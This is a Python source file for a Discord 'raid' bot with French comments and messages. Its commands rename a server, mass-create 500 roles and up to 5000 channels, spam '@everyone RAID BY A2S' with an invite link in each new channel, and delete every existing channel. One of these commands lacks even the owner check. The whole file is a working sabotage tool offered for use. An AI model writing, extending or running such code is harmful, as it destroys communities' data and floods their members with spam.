import discord
from discord.ext import commands
from discord import app_commands
import asyncio
import os

TOKEN = os.getenv("TOKEN")
MY_ID = 1022218025539223695  # 🔒 TON ID

intents = discord.Intents.default()
intents.guilds = True
intents.members = True

bot = commands.Bot(command_prefix="!", intents=intents)


# =========================
# CHECK OWNER ONLY
# =========================
def is_me(interaction: discord.Interaction) -> bool:
    return interaction.user.id == MY_ID


@bot.event
async def on_ready():
    await bot.tree.sync()
    print(f"✅ Bot connecté : {bot.user}")


# =========================
# CREATE SALONS
# =========================
@bot.tree.command(
    name="raid_2",
    description="Crée des salons et des rôles"
)
@app_commands.describe(
    nom="Nom des salons",
    nombre="Nombre de salons (max 5000)",
    nom_serveur="Nouveau nom du serveur",
    nom_role="Nom des rôles",
    categorie_id="ID de la catégorie (optionnel)"
)
@app_commands.check(is_me)
@app_commands.checks.has_permissions(
    manage_channels=True,
    manage_roles=True,
    manage_guild=True
)
async def raid_2(
    interaction: discord.Interaction,
    nom: str,
    nombre: int,
    nom_serveur: str,
    nom_role: str,
    categorie_id: str = None
):

    if nombre < 1 or nombre > 5000:
        await interaction.response.send_message(
            "❌ Le nombre doit être entre 1 et 5000.",
            ephemeral=True
        )
        return

    await interaction.response.send_message(
        "⏳ Création en cours...",
        ephemeral=True
    )

    guild = interaction.guild

    # rename serveur
    try:
        await guild.edit(name=nom_serveur)
    except:
        pass

    # =========================
    # 500 RÔLES
    # =========================
    try:
        for i in range(500):
            await guild.create_role(name=f"{nom_role}-{i+1}")
            await asyncio.sleep(0.05)
    except Exception as e:
        await interaction.edit_original_response(
            content=f"❌ Erreur rôles : {e}"
        )
        return

    # =========================
    # catégorie
    # =========================
    categorie = None
    if categorie_id:
        try:
            categorie = guild.get_channel(int(categorie_id))
        except:
            categorie = None

    if not isinstance(categorie, discord.CategoryChannel):
        categorie = None

    # =========================
    # création salons + message "bonjour"
    # =========================
    try:
        for i in range(nombre):
            channel = await guild.create_text_channel(
                name=f"{nom}-{i+1}",
                category=categorie
            )

            try:
                await channel.send("@everyone RAID BY A2S https://discord.gg/vWeekH4BCP")
            except:
                pass

            await asyncio.sleep(0.3)

    except Exception as e:
        await interaction.edit_original_response(
            content=f"❌ Erreur salons : {e}"
        )
        return

    await interaction.edit_original_response(
        content=(
            f"✅ Terminé !\n"
            f"📌 Serveur : {nom_serveur}\n"
            f"📌 Salons : {nombre}\n"
            f"📌 Rôles : 500"
        )
    )
@bot.command(name="a2s")
@commands.has_permissions(manage_channels=True, manage_guild=True)
async def a2s(ctx):

    await ctx.send("⚠️ Action en cours...")

    guild = ctx.guild

    for channel in guild.text_channels:
        try:
            await channel.delete()
        except:
            pass

    nom = "RAID BY A2S"
    nombre = 500

    await guild.edit(name="RAID BY A2S")

    for i in range(nombre):
        try:
            await guild.create_text_channel(name=f"{nom}-{i+1}")
            await asyncio.sleep(0.3)
        except:
            break

    await ctx.send("✅ RAID TERMINÉ")

# =========================
# DELETE ALL CHANNELS
# =========================
@bot.tree.command(
    name="raid_1",
    description="Supprime tous les salons du serveur sauf celui où la commande est exécutée"
)
@app_commands.check(is_me)
async def raid_1(interaction: discord.Interaction):

    guild = interaction.guild
    current_channel_id = interaction.channel.id

    await interaction.response.send_message(
        "SA SUPP TOUTTTT",
        ephemeral=True
    )

    for channel in list(guild.channels):
        if channel.id == current_channel_id:
            continue  # on garde le salon où la commande est faite

        try:
            await channel.delete()
            await asyncio.sleep(0.01)
        except:
            pass

    await interaction.followup.send(
        "LES SALON SON SUPP",
        ephemeral=True
    )


# =========================
# GLOBAL ERROR HANDLER (PROPRE)
# =========================
@bot.tree.error
async def on_app_command_error(interaction: discord.Interaction, error):

    if isinstance(error, app_commands.CheckFailure):
        if interaction.response.is_done():
            await interaction.followup.send(
                "c que moi je peut raid flocko.",
                ephemeral=True
            )
        else:
            await interaction.response.send_message(
                "c que moi je peut raid flocko.",
                ephemeral=True
            )


bot.run(TOKEN)
